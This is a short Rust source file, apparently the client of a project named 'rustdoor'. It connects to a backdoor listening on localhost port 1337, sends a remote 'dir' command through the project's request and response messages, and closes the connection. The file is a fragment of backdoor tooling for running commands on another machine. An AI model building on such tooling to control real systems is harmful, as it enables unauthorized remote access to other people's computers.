mod command;
mod connection;

use byteorder::{BigEndian, WriteBytesExt};
use ron;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::str;
use std::str::from_utf8;

use rustdoor::communication::messages::{
    MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
};

use connection::connect_to_backdoor;

fn main() {
    let mut stream = connect_to_backdoor("localhost:1337").unwrap();
    command::run_command(String::from("dir"), &mut stream);
    // This will close the connection
    drop(stream);
    println!("Done.");
}
